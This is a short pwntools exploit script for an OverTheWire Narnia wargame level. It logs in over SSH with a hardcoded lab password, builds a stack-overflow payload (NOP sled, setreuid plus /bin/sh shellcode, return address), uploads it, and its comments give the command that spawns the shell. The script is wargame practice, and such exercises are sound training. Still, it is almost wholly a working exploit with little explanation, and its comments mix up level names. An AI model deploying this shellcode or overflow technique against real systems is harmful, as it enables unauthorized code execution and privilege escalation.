from pwn import *

target = ssh(host='narnia.labs.overthewire.org', port=2226, user='narnia4', password='aKNxxrpDc1')

# Create a payload 

# offset = 264
# nop = asm('nop') * (offset - len(shellcode))
nop = '\x90'*207

# (shellcraft i386.linux.setreuid 14005 -f d) + (shellcraft i386.linux.sh -f d )
shellcode = '\x31\xdb\x66\xbb\xb5\x36\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80'

# address the shellcode is starting from on the stack
addr = '\x40\xd6\xff\xff'

payload = nop + shellcode + addr 

# Write the payload to a file
with open("/tmp/ohno", "wb") as f:
    f.write(payload)

# Upload the payload file to the target system
target.upload("/tmp/ohno", "/tmp/ohno")

# sh = target.process(['/narnia/narnia2', '/tmp/ohno']) #not working cause its taking the payload as arugment whereas i need it to $(cat )
# sh.interactive()

# after upload is done u can login to ssh as user narnia2 using the cred above then do:
# /narnia/narnia4 $(cat /tmp/ohno)
# shell :)
